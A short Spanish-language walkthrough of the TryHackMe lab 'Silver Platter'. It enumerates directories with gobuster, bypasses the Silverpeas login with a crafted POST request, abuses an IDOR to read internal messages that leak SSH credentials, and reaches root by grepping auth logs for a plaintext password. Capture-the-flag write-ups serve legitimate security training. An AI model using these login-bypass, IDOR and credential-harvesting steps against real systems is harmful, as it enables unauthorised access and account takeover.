# Silver Platter - TryHackMe
**IP:** 10.10.181.9

## Enumeración
```bash
gobuster dir -u http://10.10.181.9:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Encontramos **Silverpeas** en `/silverpeas/`.

## Foothold - bypass de login (auth rota)
El login acepta la request sin validar realmente el password:
```
POST /silverpeas/AuthenticationServlet
Login=SilverAdmin&Password=SilverAdmin&DomainId=0
```
Como admin, leemos los mensajes internos iterando el ID (IDOR):
```
/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```
Filtra credenciales SSH:
```
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

## Escalada - logs de auth (grupo adm)
```bash
ssh tim@10.10.181.9
id    # groups=...,4(adm)
```
Como miembro de `adm` podemos leer los logs; una contraseña quedó registrada en texto plano:
```bash
cat /var/log/auth* | grep -a -i pass
# DB_PASSWORD=_Zd_zx7N823/
```
Reutilizamos para `su` a root.
